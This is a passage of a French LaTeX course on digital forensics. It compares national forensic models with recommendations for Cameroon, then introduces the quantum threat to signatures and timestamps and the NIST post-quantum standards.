    le \textit{disclosure} (communication des preuves à la défense)
    est une obligation stricte qui structure toute la pratique \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.3. Royaume-Uni~: organisation forensique}\end{center}

\begin{boxCRO}
\textbf{Analyse CRO. Pourquoi le modèle britannique privilégie
$\mathcal{O}$}

Le système accusatoire britannique (\textit{adversarial system}),
avec son obligation stricte de \textit{disclosure}, crée une
pression institutionnelle constante vers la maximisation de
l'opposabilité ($\mathcal{O}$)~: toute faiblesse procédurale sera
exploitée par la défense. Cette pression a directement façonné
les quatre principes ACPO, conçus moins pour optimiser la vitesse
($\mathcal{R}$ à court terme) que pour garantir la solidité
incontestable du dossier.

\cro{$\sim$}{$\uparrow$ via rigueur procédurale}{$\uparrow\uparrow\uparrow$ priorité structurelle}
\end{boxCRO}

% ============================================================================
\section{Allemagne~: le Modèle de l'Intégration Juridique}
\label{sec:benchmark-allemagne}
% ============================================================================

\begin{tableaucours}{p{3.2cm}p{8.0cm}}{%
    \tableauHeader{Élément} &
    \tableauHeader{Caractéristique}
}
Cadre légal & Code pénal (\textit{StGB}) intègre les infractions
    cyber depuis 1986 (\S~202a, accès illicite, parmi les plus
    anciennes lois cyber d'Europe)~; conformité RGPD~\cite{rgpd2016} stricte
    (Ch.~11~(UE~SEC4031)) \\
Organisation & \textit{Bundeskriminalamt} (BKA), office fédéral
    de police criminelle, avec une division cybercriminalité
    intégrée à la structure fédérale \\
Spécificité & Tradition juridique \textit{civil law} (contrairement
    au \textit{common law} britannique/américain)~: les standards
    procéduraux sont fixés par le législateur plutôt que par la
    jurisprudence accumulée \\
Protection des données & Application particulièrement stricte des
    principes de minimisation et de proportionnalité, héritage
    direct de l'histoire allemande du~XX\textsuperscript{e}~siècle
    et de la méfiance envers la surveillance étatique \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.4. Allemagne~: organisation forensique}\end{center}

\begin{boiteRemarque}{Une leçon transposable~: la codification précoce}
L'Allemagne illustre qu'un système \textit{civil law} (comme le
système camerounais, héritier du droit français) peut atteindre
une maturité forensique élevée \textbf{sans dépendre d'une
jurisprudence accumulée sur des décennies}, à condition que
le cadre légal soit précis, régulièrement mis à jour, et appliqué
avec constance. C'est directement pertinent pour le Cameroun~:
la \loicam{2010/012}~\cite{cameroun2010a} et la \loicam{2024/017}~\cite{cameroun2024donnees} (Ch.~12~(UE~SEC4031))
suivent cette même logique de codification précise plutôt que
d'attente d'une jurisprudence abondante.
\end{boiteRemarque}

% ============================================================================
\section{Singapour~: le Modèle de l'Investissement Ciblé}
\label{sec:benchmark-singapour}
% ============================================================================

\subsection{Un cas d'étude pertinent pour le Cameroun}

Singapour mérite une attention particulière~: comme le Cameroun,
c'est un pays de taille moyenne, sans l'héritage institutionnel
des grandes puissances occidentales, qui a dû construire sa capacité
forensique à partir d'un point de départ comparable.

\begin{tableaucours}{p{3.2cm}p{8.0cm}}{%
    \tableauHeader{Élément} &
    \tableauHeader{Caractéristique}
}
Cadre légal & \textit{Computer Misuse Act}~1993 (révisé
    régulièrement, dernière révision majeure~2017)~; \textit{Personal
    Data Protection Act}~2012 \\
Organisation & \textit{Singapore Police Force Cybercrime Command}~;
    coordination étroite avec l'autorité de régulation
    \textit{Cyber Security Agency} (CSA), créée en~2015 \\
Stratégie & Investissement ciblé sur un nombre limité de capacités
    critiques plutôt que tentative de couverture exhaustive
    immédiate~; partenariats publics-privés structurés
    (Interpol Global Complex for Innovation, basé à Singapour) \\
Facteur clé & Décision politique explicite de faire de la
    cybersécurité un axe stratégique national, avec financement
    soutenu sur le long terme \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.5. Singapour~: organisation forensique}\end{center}

\begin{boiteRemarque}{Pourquoi ce modèle est pertinent, et pourquoi il
ne se transpose pas automatiquement}
Singapour a construit sa capacité en \textbf{20--25~ans} avec un
PIB par habitant et un niveau de financement public sans commune
mesure avec celui du Cameroun. La leçon transposable n'est pas le
montant des investissements, mais la \textbf{méthode}~: cibler un
nombre restreint de capacités prioritaires (ici~: la lutte contre
la fraude financière, secteur économiquement stratégique pour
Singapour) plutôt que de disperser des ressources limitées sur
l'ensemble du spectre forensique.
\end{boiteRemarque}

% ============================================================================
\section{Afrique~: Panorama Régional}
\label{sec:benchmark-afrique}
% ============================================================================

\subsection{Maturité variable, dynamiques communes}

Le Chapitre~11~(UE~SEC4031) a déjà présenté les cadres régionaux
africains (CEDEAO, SADC, EAC). Ce chapitre se concentre sur
l'organisation institutionnelle effective de quelques pays de
référence.

\begin{tableaucours}{p{2.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Pays} &
    \tableauHeader{Organisation forensique} &
    \tableauHeader{Élément distinctif}
}
\textbf{Afrique du Sud} & \textit{Cybercrimes Act}~2020~;
    laboratoire forensique \textit{SAPS} (police sud-africaine)
    établi de longue date &
    Le système le plus abouti d'Afrique subsaharienne~; coopération
    INTERPOL active de longue date \\
\textbf{Kenya} & \textit{Computer Misuse and Cybercrimes Act}~2018~;
    \textit{National KE-CIRT/CC} (équipe nationale de réponse
    aux incidents) &
    Écosystème fintech (M-Pesa) ayant accéléré le développement
    de capacités anti-fraude spécialisées \\
\textbf{Rwanda} & \textit{Law on Prevention and Punishment of
    Cyber Crimes}~2018~; \textit{National Cyber Security Authority}
    (NCSA) &
    Stratégie nationale de transformation numérique articulée
    explicitement avec le développement des capacités cyber \\
\textbf{Nigéria} & \textit{Cybercrimes Act}~2015~; \textit{EFCC}
    (\textit{Economic and Financial Crimes Commission}) dispose
    d'une unité cyber dédiée &
    Volume d'affaires considérable (fraude en ligne) ayant
    forcé une professionnalisation rapide malgré des ressources
    limitées \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.6. Panorama de quatre pays africains de référence}\end{center}

\subsection{Facteurs communs de progression observés}

\begin{enumerate}
    \item \textbf{Un cadre légal codifié précisément}, même récent,
          vaut mieux qu'un cadre ancien mais vague, l'Allemagne
          (Section~\ref{sec:benchmark-allemagne}) et le Rwanda
          partagent cette logique malgré des contextes très différents.
    \item \textbf{Un secteur économique moteur} (fintech au Kenya,
          finance en Afrique du Sud) accélère souvent le développement
          de capacités spécialisées plus efficacement qu'une approche
          générale.
    \item \textbf{La coopération régionale} (AFRIPOL, INTERPOL
          régional, Ch.~10~(UE~SEC4031)) compense partiellement
          les limites de capacité nationale individuelle.
    \item \textbf{La continuité institutionnelle} compte davantage
          que l'ampleur initiale des moyens~: les pays qui ont
          maintenu un effort constant sur~10--15~ans (Rwanda, Kenya)
          montrent une progression plus nette que ceux ayant connu
          des ruptures de financement ou de priorité politique.
\end{enumerate}

% ============================================================================
\section{Synthèse Comparative~: ce qui Varie et Pourquoi}
\label{sec:synthese-comparative}
% ============================================================================

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Juridiction} &
    \tableauHeader{Force distinctive} &
    \tableauHeader{Facteur explicatif principal}
}
USA & Recherche, normalisation, volume &
    Investissement public soutenu (NIST) + industrie privée +
    volume d'affaires \\
UK & Rigueur procédurale (ACPO) &
    Pression structurelle du système accusatoire (\textit{disclosure}) \\
Allemagne & Intégration juridique précoce &
    Codification précise en \textit{civil law}, sans dépendance
    à la jurisprudence \\
Singapour & Efficacité par ciblage &
    Décision politique de long terme~+ ciblage sectoriel
    (finance) \\
Afrique du Sud & Maturité régionale &
    Continuité institutionnelle longue~+ coopération internationale \\
Kenya/Rwanda & Progression rapide récente &
    Secteur moteur (fintech)~/ stratégie numérique nationale
    articulée \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.7. Synthèse~: force distinctive et facteur explicatif}\end{center}

\begin{boxCRO}
\textbf{Analyse CRO. Pourquoi il n'existe pas de modèle universellement
optimal}

Chaque système national reflète un arbitrage CRO façonné par son
contexte juridique et institutionnel propre, pas une hiérarchie
objective de qualité.

Le Royaume-Uni privilégie structurellement $\mathcal{O}$ (système
accusatoire). Les États-Unis investissent massivement dans
$\mathcal{R}$ (recherche, normalisation technique). Singapour
optimise l'efficacité globale par ciblage plutôt que par
maximisation d'une dimension unique.

\cro{variable selon contexte}{variable selon priorité nationale}{variable selon système juridique}

\textbf{Conséquence pour le Cameroun~:} la question pertinente
n'est pas ``quel pays imiter'' mais ``quel arbitrage CRO correspond
aux priorités et contraintes camerounaises actuelles~?''
(Section~\ref{sec:recommandations-cameroun}).
\end{boxCRO}

% ============================================================================
\section{Recommandations pour le Cameroun}
\label{sec:recommandations-cameroun}
% ============================================================================

\subsection{Où le Cameroun se situe aujourd'hui}

Le Chapitre~12~(UE~SEC4031) a établi que le Cameroun dispose
d'un cadre légal récent et structuré (\loicam{2010/012},
\loicam{2024/017}) suivant la même logique de codification précise
que l'Allemagne. C'est un atout réel, souvent sous-estimé~: la
qualité du texte légal n'est pas le facteur limitant principal
identifié dans ce cours.

\begin{tableaucours}{p{4.0cm}p{7.5cm}}{%
    \tableauHeader{Atout actuel} &
    \tableauHeader{Élément}
}
Cadre légal codifié & \loicam{2010/012} et \loicam{2024/017}~:
    structure comparable aux textes allemands dans leur logique
    (codification précise plutôt que jurisprudentielle) \\
Coopération régionale & Accès à la Convention de Malabo~\cite{malabo2014}, à AFRIPOL et à
    INTERPOL (Ch.~10~(UE~SEC4031)), atout partagé avec
    les pays africains les plus avancés \\
Formation universitaire & Ce cours lui-même illustre l'émergence
    d'une formation structurée de niveau master, condition
    identifiée comme nécessaire dans tous les modèles étudiés \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.8. Atouts actuels du Cameroun}\end{center}

\subsection{Recommandations réalistes, ancrées dans les contraintes}

\begin{enumerate}
    \item \textbf{Cibler plutôt que disperser} (leçon de Singapour)~:
          identifier un ou deux domaines économiquement stratégiques
          (fraude Mobile Money, étant donné le poids économique de
          ce secteur au Cameroun) et y concentrer les premiers
          investissements de capacité spécialisée, plutôt que
          chercher une couverture exhaustive immédiate.
    \item \textbf{Maintenir la continuité institutionnelle}
          (leçon du Rwanda/Kenya)~: la progression observée dans
          les pays africains de référence résulte d'un effort
          soutenu sur~10--15~ans, pas de pics d'investissement
          ponctuels.
    \item \textbf{Investir dans la certification professionnelle}~:
          aucun des modèles étudiés n'a atteint une maturité
          forensique sans un système de qualification reconnu
          des experts (IACIS aux USA, UKAS au UK). Le
          Décret~69/DF/544 camerounais (Ch.~12~(UE~SEC4031))
          est une base~; son application effective et son
          renforcement méritent une attention prioritaire.
    \item \textbf{Exploiter la coopération régionale comme levier},
          pas comme substitut~: la coopération AFRIPOL/INTERPOL et la Convention de Malabo
          (Ch.~10~(UE~SEC4031)) compense des limites de
          capacité nationale, mais ne dispense pas de construire
          une expertise locale minimale et durable.
    \item \textbf{Rester lucide sur les comparaisons}~: le Cameroun
          ne dispose pas du budget de Singapour ni du volume
          d'affaires des États-Unis. Une stratégie réaliste se
          construit à partir des contraintes réelles, pas d'un
          objectif de ``rattrapage'' générique et non quantifié.
\end{enumerate}

\begin{boxalert}
\textbf{Une mise en garde contre les discours non étayés}

Les discours promettant un ``rattrapage rapide'' ou un
``leapfrogging technologique'' généralisé méritent une lecture
critique systématique~: ils s'appuient rarement sur une analyse
des contraintes réelles (budgétaires, humaines, institutionnelles)
et tendent à minimiser le temps nécessaire à la construction de
capacités durables. Les exemples étudiés dans ce chapitre
(Singapour~: 20--25~ans~; Rwanda/Kenya~: progression continue sur
10--15~ans) montrent que la maturité forensique se construit sur
le temps long, par des choix structurels cohérents et maintenus, pas par des annonces de rupture technologique.
\end{boxalert}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Aucun modèle national n'est universellement
          optimal}~: chaque système reflète un arbitrage CRO
          façonné par son contexte juridique propre (système
          accusatoire britannique~$\to$ priorité~$\mathcal{O}$~;
          investissement fédéral américain~$\to$ priorité
          $\mathcal{R}$ via la recherche).

    \item \textbf{Le Royaume-Uni} a développé les principes ACPO
          (Ch.~7~(UE~SEC4031)) sous la pression structurelle
          de l'obligation de \textit{disclosure}.

    \item \textbf{L'Allemagne} démontre qu'un système \textit{civil
          law} (comme le Cameroun) peut atteindre une maturité
          élevée par la codification précise, sans dépendre
          d'une jurisprudence accumulée, leçon directement
          transposable.

    \item \textbf{Singapour} illustre l'efficacité du ciblage
          sectoriel plutôt que la dispersion sur l'ensemble
          du spectre forensique, construit sur~20--25~ans.

    \item \textbf{Le Kenya et le Rwanda} montrent qu'un secteur
          économique moteur (fintech) ou une stratégie numérique
          nationale articulée peuvent accélérer significativement
          le développement de capacités spécialisées, sur une
          continuité de~10--15~ans.

    \item \textbf{Pour le Cameroun}~: le cadre légal
          (\loicam{2010/012}, \loicam{2024/017}) est un atout réel.
          Les recommandations réalistes privilégient le ciblage
          sectoriel (Mobile Money), la continuité institutionnelle,
          le renforcement de la certification professionnelle et
          l'exploitation de la coopération régionale comme levier.

    \item \textbf{Posture critique obligatoire}~: se méfier des
          discours de rattrapage technologique rapide non étayés
          par une analyse réaliste des contraintes et du temps
          nécessaire.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~25.1. Identifier les facteurs explicatifs \niveaubase}]
Pour chacun des pays suivants, identifiez (à partir du Tableau~25.7)
le facteur explicatif principal de sa force distinctive, et formulez
une question que vous poseriez pour vérifier si ce facteur est
transposable au Cameroun~:
\begin{enumerate}[(a)]
    \item Royaume-Uni
    \item Allemagne
    \item Singapour
    \item Kenya
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~25.2. Analyse critique d'un discours \niveaumoyen}]
Un consultant présente la proposition suivante~: ``Le Cameroun
doit investir massivement dans l'intelligence artificielle
forensique pour combler en~3~ans l'écart avec les pays occidentaux,
en s'appuyant sur l'absence de systèmes legacy qui freinent
l'innovation dans les pays développés.''
\begin{enumerate}[(a)]
    \item Identifiez dans cette proposition les éléments non
          étayés par les analyses de ce chapitre.
    \item Sur la base des exemples étudiés (Singapour, Rwanda,
          Kenya), quel délai réaliste suggéreriez-vous pour des
          progrès significatifs, et pourquoi~?
    \item Reformulez cette proposition de façon plus rigoureuse,
          en vous appuyant sur les recommandations de la
          Section~\ref{sec:recommandations-cameroun}.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~25.3. Stratégie nationale argumentée \niveauexpert}]
Vous êtes consulté par l'ANTIC pour contribuer à l'élaboration
d'une feuille de route nationale de développement de la capacité
forensique numérique sur 10~ans.
\begin{enumerate}[(a)]
    \item Proposez un secteur prioritaire de ciblage initial
          (sur le modèle de Singapour) en justifiant votre choix
          par des éléments du contexte économique et criminel
          camerounais évoqués dans ce cours (Ch.~3~(UE~SEC4031),
          Ch.~\ref{chap:cas-int}).
    \item Identifiez trois éléments institutionnels (parmi ceux
          étudiés dans ce chapitre~: laboratoire centralisé,
          certification professionnelle, coopération régionale,
          formation universitaire) à prioriser dans les
          3~premières années, en justifiant l'ordre choisi.
    \item Appliquez la grille CRO à votre proposition~: quel
          arbitrage $\mathcal{C}$/$\mathcal{R}$/$\mathcal{O}$
          votre stratégie privilégie-t-elle, et est-ce cohérent
          avec les priorités identifiées en (a)~?
    \item Rédigez un paragraphe de mise en garde contre les
          écueils identifiés dans ce chapitre (dispersion des
          ressources, discours non étayés, rupture de continuité)
          à inclure dans votre feuille de route.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Après cette mise en perspective comparative,
la Partie~VI revient aux fondements~: la preuve numérique repose sur
des primitives cryptographiques (empreintes, signatures, horodatages)
dont l'informatique quantique menace à terme la solidité. Le
chapitre suivant mesure cet impact sur les preuves signées
aujourd'hui.
\end{boxinfo}
    
    % ======================================================================
    % PARTIE VI - CRYPTO-FORENSIQUE ET CONTRIBUTIONS ORIGINALES
    % Contributions : Trilemme CRO (ePrint 2025/1348), ZK-NR (ePrint 2025/1138)
    % Niveau : expert - recherche
    % ======================================================================
    \part{Crypto-Forensique et Contributions Originales}
    \label{part:crypto}

        % ============================================================================
% Fichier  : partie6/P06_C26_impact_quantique.tex
% Titre    : Impact du Quantique sur l'Investigation Numérique
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Impact du Quantique sur l'Investigation Numérique}
\label{chap:quantique}

\epigraph{%
    « Quantum computing will change everything we know about digital
    security and forensics. Preparation isn't optional, it's
    essential. »%
}{Whitfield Diffie}

\niveauChapitre{Expert}{%
    Notions de cryptographie symétrique et asymétrique requises.
    Chapitres~8~(UE~SEC4031) (hash, intégrité) et
    11~(UE~SEC4031) (eIDAS, signatures qualifiées) indispensables~:
    ce chapitre interroge leur pérennité à long terme.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre, sans détail mathématique excessif, pourquoi
          les algorithmes de Shor et Grover menacent la cryptographie
          actuelle et selon quel calendrier réaliste.
    \item Identifier précisément quels mécanismes forensiques du
          cours reposent sur une cryptographie potentiellement
          vulnérable~: hash, signatures, horodatage.
    \item Comprendre la menace ``\textit{Harvest Now, Decrypt Later}''
          et son impact sur les preuves numériques actuelles et futures.
    \item Connaître les standards de cryptographie post-quantique
          (PQC) effectivement normalisés par le NIST.
    \item Évaluer de façon critique les affirmations sur l'imminence
          de la menace quantique, en distinguant le consensus
          scientifique des spéculations commerciales.
    \item Formuler des recommandations pragmatiques pour la
          pratique forensique camerounaise actuelle.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Pourquoi ce chapitre ouvre la Partie~VI}
% ============================================================================

Tout au long de ce cours, le hash SHA-256 a été présenté comme la
garantie ultime de l'intégrité d'une preuve (Ch.~8~(UE~SEC4031))~;
la signature électronique qualifiée comme la garantie ultime de
l'authenticité d'un document (Ch.~11~(UE~SEC4031))~. Ces garanties
reposent sur une hypothèse implicite~: qu'aucun adversaire ne dispose
de la puissance de calcul nécessaire pour les casser. L'informatique
quantique, si elle atteint la maturité technique annoncée, lève
précisément cette hypothèse.

Ce chapitre ne prétend pas résoudre cette question, elle reste,
en juin~2026, un sujet de recherche actif et débattu. Il vise à vous
donner les moyens de comprendre l'enjeu, d'évaluer les affirmations
que vous rencontrerez sur ce sujet avec un esprit critique, et
d'adopter dès aujourd'hui des pratiques raisonnables sans céder
à un alarmisme commercial.

\separateur

% ============================================================================
\section{La Menace Quantique~: ce que Disent Réellement Shor et Grover}
\label{sec:menace-quantique}
% ============================================================================

\subsection{L'algorithme de Shor}

\begin{boxdef}
\textbf{Algorithme de Shor}\index{Shor, algorithme de} (Peter Shor,
1994)~: algorithme quantique permettant de factoriser de grands
nombres entiers et de résoudre le problème du logarithme discret
en temps polynomial, contre un temps exponentiel pour les
meilleurs algorithmes classiques connus. Sa portée pratique dépend
entièrement de la disponibilité d'un \textbf{ordinateur quantique
suffisamment puissant et stable} pour l'exécuter sur des clés de
taille réelle, ce qui n'est pas le cas en~2026.
\end{boxdef}

L'algorithme de Shor menace directement les cryptosystèmes à clé
publique fondés sur la difficulté de factorisation ou du logarithme
discret~:

\begin{tableaucours}{p{3.0cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Algorithme} &
    \tableauHeader{Fondement mathématique} &
    \tableauHeader{Usage forensique concerné (ce cours)}
}
\textbf{RSA} & Factorisation de grands entiers &
    Signatures électroniques (Ch.~11~(UE~SEC4031)),
    chiffrement TLS (Ch.~\ref{chap:for-res}) \\
\textbf{ECC / ECDSA} & Logarithme discret sur courbes elliptiques &
    Signatures électroniques modernes, Bitcoin (Ch.~\ref{chap:for-cloud})~;
    plus efficace que RSA, donc largement adopté \\
\textbf{Diffie-Hellman} & Logarithme discret &
    Établissement de clés pour connexions chiffrées (VPN, TLS) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~26.1. Cryptosystèmes vulnérables à Shor}\end{center}

\begin{boxalert}
\textbf{Sur les chiffres de qubits~: prudence méthodologique}

Des estimations publiées dans la littérature scientifique évoquent
des ordres de grandeur de plusieurs milliers de \textbf{qubits
logiques} (et non physiques) nécessaires pour casser RSA-2048 dans
des délais opérationnels. Ces estimations varient significativement
selon les hypothèses techniques retenues (taux de correction
d'erreur, architecture). \textbf{Aucun consensus scientifique
ferme} n'existe en~2026 sur un calendrier précis. Méfiez-vous de
toute affirmation présentant une date exacte (``RSA cassé en~2035'')
comme un fait établi~: il s'agit, au mieux, de projections
spéculatives sujettes à révision constante.
\end{boxalert}

\subsection{L'algorithme de Grover}

\begin{boxdef}
\textbf{Algorithme de Grover}\index{Grover, algorithme de}
(Lov Grover, 1996)~: algorithme quantique offrant une
\textbf{accélération quadratique} (et non exponentielle) pour
la recherche dans une base de données non structurée. Appliqué
au cassage de clés symétriques, il réduit effectivement la
sécurité d'une clé de $n$~bits à environ~$n/2$~bits
``équivalent classique''.
\end{boxdef}

\begin{boxCRO}
\textbf{Analyse CRO. Pourquoi Grover est une menace bien moindre que Shor}

L'accélération de Grover est \textbf{quadratique}, pas exponentielle.
Concrètement~: une clé AES-256 (utilisée dans le chiffrement
BitLocker du Ch.~9~(UE~SEC4031), le principe 3-2-1 du
Ch.~6~(UE~SEC4031)) offrirait, face à un ordinateur quantique
exploitant Grover, une sécurité ``équivalente'' à environ
128~bits classiques, ce qui reste largement considéré comme
sûr selon les standards actuels.

$\mathcal{R}$~: la menace de Grover sur AES-256 est gérable
simplement en doublant la longueur de clé (AES-128~$\to$~AES-256)~;
elle ne nécessite pas de nouvel algorithme.

$\mathcal{O}$/$\mathcal{C}$~: la véritable rupture concerne la
cryptographie asymétrique (Shor), pas symétrique (Grover), une
distinction souvent floutée dans les discours non spécialisés.

\cro{$\sim$ non affecté}{$\sim$ AES-256 reste robuste}{$\sim$ non affecté}

\textbf{Conséquence pratique~:} pour le chiffrement symétrique
utilisé en forensique (BitLocker, VeraCrypt, Ch.~6~(UE~SEC4031)),
l'usage déjà recommandé d'AES-256 plutôt qu'AES-128 constitue
une protection raisonnable face à Grover. La vraie urgence
concerne les signatures et le chiffrement asymétrique.
\end{boxCRO}

% ============================================================================
\section{``Harvest Now, Decrypt Later''~: Implication pour les Preuves}
\label{sec:harvest-now}
% ============================================================================

\subsection{Le mécanisme de la menace}

\begin{boxdef}
\textbf{Harvest Now, Decrypt Later}\index{Harvest Now, Decrypt Later}~:
stratégie consistant, pour un adversaire, à intercepter et stocker
aujourd'hui des communications chiffrées qu'il ne peut pas
déchiffrer actuellement, dans l'attente qu'un ordinateur quantique
suffisamment puissant devienne disponible pour les déchiffrer
\textit{a posteriori}.
\end{boxdef}

Cette stratégie est documentée comme une préoccupation sérieuse
des agences de sécurité nationale (notamment américaines et
britanniques, qui ont publiquement justifié leurs feuilles de
route de migration PQC par ce risque), indépendamment de
l'incertitude sur le calendrier exact de la menace.

\subsection{Implication directe pour la forensique}

\begin{boxCRO}
\textbf{Analyse CRO. Harvest Now, Decrypt Later et preuves numériques}

Cette menace inverse une intuition habituelle du cours~: jusqu'ici,
le risque pour une preuve portait sur son \textbf{intégrité présente}
(a-t-elle été altérée~?). La menace HNDL porte sur sa
\textbf{confidentialité future}~: des données chiffrées aujourd'hui
de façon réputée sûre (communications interceptées légalement,
Ch.~\ref{chap:for-res}~; données saisies chiffrées, Ch.~9~(UE~SEC4031))
pourraient devenir lisibles dans~10 à~20~ans par un tiers ayant
conservé une copie.

$\mathcal{C}$~: pour des données à \textbf{durée de sensibilité
longue} (affaires d'État, données de santé du Ch.~\ref{chap:for-iot},
secrets industriels), cette menace est directement pertinente
\emph{dès aujourd'hui}, car le chiffrement appliqué maintenant
devra rester sûr pendant des décennies.

$\mathcal{R}$/$\mathcal{O}$~: pour la plupart des affaires
forensiques courantes traitées dans ce cours (fraude MoMo,
ransomware, BEC), l'horizon temporel pertinent
(quelques années jusqu'au jugement) rend cette menace moins
urgente que pour des données à très longue durée de sensibilité.

\cro{$\downarrow\downarrow$ pour données longue durée}{$\sim$}{$\sim$}
\end{boxCRO}

% ============================================================================
\section{Impact sur la Chaîne de Custody et l'Intégrité Long Terme}
\label{sec:impact-custody}
% ============================================================================

\subsection{Trois mécanismes du cours potentiellement concernés}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Mécanisme (chapitre)} &
    \tableauHeader{Fondement cryptographique} &
    \tableauHeader{Vulnérabilité quantique}
}
Hash SHA-256
    (Ch.~8~(UE~SEC4031)) & Fonction de hachage, pas de
    clé publique/privée &
    \textbf{Non vulnérable à Shor.} Affaibli par Grover, mais
    SHA-256 offre une marge de sécurité suffisante
    (cf.~Analyse CRO ci-dessus) \\
Signature électronique
    qualifiée eIDAS
    (Ch.~11~(UE~SEC4031)) & Typiquement RSA ou ECDSA &
    \textbf{Vulnérable à Shor} si et quand un ordinateur quantique
    suffisant existe \\
Horodatage qualifié
    (Ch.~11~(UE~SEC4031)) & Repose sur une signature
    (RSA/ECDSA) de l'autorité d'horodatage &
    \textbf{Vulnérable indirectement}, via la signature
    sous-jacente \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~26.2. Mécanismes forensiques et vulnérabilité quantique}\end{center}

\begin{boiteRemarque}{Une nuance importante~: hash et signature ne sont
pas équivalents face au quantique}
Une confusion fréquente mérite d'être dissipée~: le \textbf{hash
SHA-256} qui garantit l'intégrité d'une image E01 (Ch.~9~(UE~SEC4031))
n'est \textbf{pas} menacé de la même façon qu'une \textbf{signature
RSA/ECDSA} qui authentifie un document. Les fonctions de hachage
ne reposent pas sur la difficulté de factorisation, elles
résistent structurellement mieux à l'algorithme de Shor. C'est
la cryptographie asymétrique (signatures, échange de clés) qui
constitue le point de rupture principal, pas le hachage utilisé
quotidiennement en forensique.
\end{boiteRemarque}

\subsection{Le problème du re-timestamping}

Si l'algorithme de signature sous-jacent à un horodatage qualifié
devient un jour cassable, l'horodatage perd sa valeur probatoire
de \textit{preuve d'antériorité}. La pratique de
\textbf{re-timestamping périodique} (réappliquer un nouvel
horodatage, avec un algorithme à jour, sur une preuve archivée
avant que l'algorithme original ne soit compromis) est une
recommandation déjà formulée par certaines autorités
d'archivage à long terme (notamment dans le domaine de
l'archivage légal électronique), indépendamment du calendrier
précis de la menace quantique.

% ============================================================================
\section{Cryptographie Post-Quantique~: Standards Réellement Normalisés}
\label{sec:pqc-standards}
% ============================================================================

\subsection{Les standards NIST FIPS}

Contrairement à une partie significative du discours sur le sujet,
le NIST a effectivement publié des \textbf{standards finalisés}
de cryptographie post-quantique (PQC), et non de simples
propositions~:

\begin{tableaucours}{p{3.2cm}p{2.8cm}p{4.5cm}}{%
    \tableauHeader{Algorithme} &
    \tableauHeader{Standard NIST} &
    \tableauHeader{Usage}
}
\textbf{CRYSTALS-Kyber} & FIPS~203
    (\textit{ML-KEM}) & Encapsulation de clés (échange de
    clés sécurisé), standard principal \\
\textbf{CRYSTALS-Dilithium} & FIPS~204
    (\textit{ML-DSA}) & Signatures numériques, standard
    principal \\
\textbf{SPHINCS+} & FIPS~205
    (\textit{SLH-DSA}) & Signatures fondées sur le hachage
    (alternative, plus conservatrice mathématiquement) \\
\textbf{FALCON} & En cours de
    standardisation & Signatures compactes, fondées sur les
    réseaux euclidiens (NTRU) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~26.3. Standards PQC du NIST}\end{center}

\begin{boiteRemarque}{Ce qui distingue un standard authentique d'une
affirmation marketing}
La publication d'un \textbf{FIPS} (\textit{Federal Information
Processing Standard}) par le NIST est un processus public,
documenté, avec plusieurs années de revue par la communauté
cryptographique internationale. Quand vous rencontrez une
affirmation sur un algorithme ``post-quantique'', vérifiez
systématiquement~: s'agit-il d'un FIPS publié (vérifiable sur
\texttt{csrc.nist.gov}), d'un candidat encore en évaluation, ou
d'une simple allégation commerciale~? Cette vérification est
une application directe de l'esprit critique developpé tout au
long de ce cours (Ch.~7~(UE~SEC4031)~: distinguer un standard
réel d'une affirmation non sourcée).
\end{boiteRemarque}

\subsection{Migration hybride~: la pratique recommandée actuelle}

La transition recommandée par les agences de cybersécurité
occidentales (NSA, ANSSI, NCSC-UK) n'est \textbf{pas} un
remplacement immédiat et total de la cryptographie classique,
mais une approche \textbf{hybride}~: combiner un algorithme
classique éprouvé (RSA ou ECC) avec un algorithme post-quantique
normalisé, de sorte que la sécurité globale repose sur la
robustesse du \emph{plus fort} des deux mécanismes.

\begin{boxoutils}{Principe de la migration hybride (vue conceptuelle)}
\begin{lstlisting}[language=bash_forensique]
# PRINCIPE (illustration conceptuelle, pas une implementation a
# copier telle quelle -- toujours utiliser des bibliotheques
# cryptographiques auditees et maintenues, jamais de code
# cryptographique fait maison)

# Etablissement de cle hybride classique + post-quantique :
# 1. Generer un secret partage via ECDH (classique, eprouve)
# 2. Generer un secret partage via Kyber/ML-KEM (post-quantique)
# 3. Combiner les deux secrets (ex: via une fonction de derivation
#    de cle type HKDF) pour obtenir la cle finale
#
# Securite resultante = securite du MEILLEUR des deux mecanismes
# Un attaquant doit casser LES DEUX pour compromettre la cle

# Implementations reelles et auditees (a la date de redaction) :
# - OpenSSL 3.2+ : support experimental ML-KEM
# - liboqs (Open Quantum Safe project, OQS) : bibliotheque
#   de reference pour l'experimentation PQC
# - Signal Protocol : a deploye PQXDH (hybride X25519 + Kyber)
#   en production des 2023 pour l'echange de cles
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{``Quantum Forensics''~: Distinguer Recherche et Pratique Établie}
\label{sec:quantum-forensics-critique}
% ============================================================================

\begin{boxalert}
